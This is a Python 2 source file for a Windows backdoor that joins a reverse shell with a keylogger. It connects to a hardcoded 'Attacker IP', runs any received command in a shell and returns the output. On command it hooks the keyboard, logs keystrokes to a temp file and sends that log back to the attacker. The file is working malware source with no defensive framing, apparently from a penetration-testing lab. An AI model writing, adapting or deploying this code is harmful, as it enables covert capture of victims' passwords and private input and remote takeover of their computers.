import socket                     # For Building TCP Connection
import subprocess                 # To start the shell in the system
import pythoncom, pyHook
import os

import tempfile           # Used to Create a temp directory
import shutil             # Used to Remove the temp directory
import time
import shutil             # Used to Remove the temp directory
global keys

global store
store=''
def transfer(s,path):
    if os.path.exists(path):
        print path
        f = open(path+'\keylogs.txt', 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet)
            #print 'sending packet' -- for troubleshooting transfer
            packet = f.read(1024)
            #print 'read new packet'
        s.send('DONE')
        f.close()

    else: # the file doesn't exist
        s.send('Unable to find out the file')
def connect():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # start a socket object 's' 
    s.connect(('192.168.50.10', 8080))                            # Here we define the Attacker IP and the listening port
 
    while True:                                                 # keep receiving commands from the Kali machine
        #print 'receiving command'              -- for testing
        command =  s.recv(1024)                                 # read the first KB of the tcp socket
        
        if 'terminate' in command:                  # if we got termiante order from the attacker, close the socket and break the loop
            s.close()
            break
        if 'hook' in command:
            store=''
            dirpath = tempfile.mkdtemp()
            #print dirpath			-- for testing
            prevdir=os.getcwd()
            os.chdir(dirpath)
            s.send('hooking')
            obj = pyHook.HookManager()
            obj.KeyDown = keypressed
            obj.HookKeyboard()
            while True:
                
                time.sleep(0.01)
                pythoncom.PumpWaitingMessages()
                s.settimeout(0.01)
                x=''
                try:
                    x=s.recv(1024)
                    s.settimeout(None)
                except Exception,e:
                    pass
                if 'unhook' in x:
                    print 'before unhook'
                    obj.UnhookKeyboard()
                    print 'after unhook'
                    os.chdir(prevdir)
                    s.send('unhooked')
                    break
                    
                    
                
        if 'exfil' in command:
            try:
                transfer(s,dirpath)
            except Exception,e:
                s.send(str(e))
                pass
            shutil.rmtree(dirpath)                  #to delete created temp file 

            
        
        else:                                      # otherwise, we pass the received command to a shell process
                            
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) # send back the result
            s.send( CMD.stderr.read()  ) # send back the error -if any-, such as syntax error
def keypressed(event):
    global keys
    global store
    keys=''
    
    
    
    if event.Ascii==13:
        keys=' < Enter > ' 
    elif event.Ascii==8:
        keys=' <BACK SPACE> '
    else:
        keys=chr(event.Ascii)
    
    print keys
    store = store + keys
    print store
    fp=open("keylogs.txt","w")
    fp.write(store)
    fp.close()
    return True

def main ():
    
    connect()
    keypressed(event)
main()







